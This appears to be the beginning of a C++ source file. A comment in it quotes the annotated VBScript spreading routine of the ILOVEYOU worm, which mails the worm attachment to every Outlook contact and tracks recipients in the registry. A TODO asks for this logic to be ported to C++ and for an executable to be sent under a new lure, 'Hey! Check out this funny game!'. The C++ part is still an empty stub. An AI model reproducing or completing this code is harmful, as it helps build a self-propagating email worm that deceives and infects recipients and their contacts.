#define WIN32_LEAN_AND_MEAN
#define NOMINMAX

#include <windows.h>

/*
* TODO: Implement this email sending logic in c++

rem Subroutine to send emails to the user's contacts through MAPI
rem (Messaging Application Programming Interface), the API used by Outlook to
rem communicate with the Microsoft Exchange Server which also hosts calendars
rem and address book.
Sub spreadtoemail()
  On Error Resume Next
  Dim x, a, ctrlists, ctrentries, malead, b, regedit, regv, regad

  rem Creates a shell to edit the registry.
  Set regedit = CreateObject("WScript.Shell")
  rem Creates a new Outlook application object instance, to access the MAPI.
  Set out = WScript.CreateObject("Outlook.Application")
  rem Gets the MAPI namespace used to access the address book lists.
  Set mapi = out.GetNameSpace("MAPI")

  rem Goes through all contacts in the address book and sends an email
  rem with the LOVE-LETTER-FOR-YOU program as an attachment.
  For ctrlists = 1 To mapi.AddressLists.Count
    Set a = mapi.AddressLists(ctrlists)
    x = 1
    rem Gets a registry key that is used to check who has been sent an email,
    rem already to ensure that even if there may be duplicate contacts, it will
    rem only send the email once to the same address.
    regv = regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & a)

    If (regv = "") Then
      regv = 1
    End If

    If (int(a.AddressEntries.Count) > int(regv)) Then
      rem Iterates over each entry in the address list.
      For ctrentries = 1 To a.AddressEntries.Count
        malead = a.AddressEntries(x)
        regad = ""
        regad = regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & malead )

        rem If the contact hasn't yet been sent an email, a new email will be
        rem composed with the virus attached and a "kind" message and the
        rem subject "ILOVEYOU".
        If (regad = "") Then
          Set male = out.CreateItem(0)

          male.Recipients.Add(malead)
          male.Subject = "ILOVEYOU"
          male.Body = vbcrlf & "kindly check the attached LOVELETTER coming from me."
          male.Attachments.Add(dirsystem & "\LOVE-LETTER-FOR-YOU.TXT.vbs")
          male.Send

          rem Sets the registry key to indicate that the email has been sent
          rem to the current contact.
          regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & malead, 1, "REG_DWORD"
        End If

        x = x + 1
      Next

      regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & a, a.AddressEntries.Count
    Else
      regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & a, a.AddressEntries.Count
    End If
  Next

  Set out = Nothing
  Set mapi = Nothing
End Sub

- this should include the executable on the email's body and be on this style:
Title: Hey! Check out this funny game!
Body: Its an online game about catching bugs and displaying them on your collection!
      If you have some spare time, go play with me!
*/

namespace EmailsAndShit {
    // TODO: functions to do that in steps
}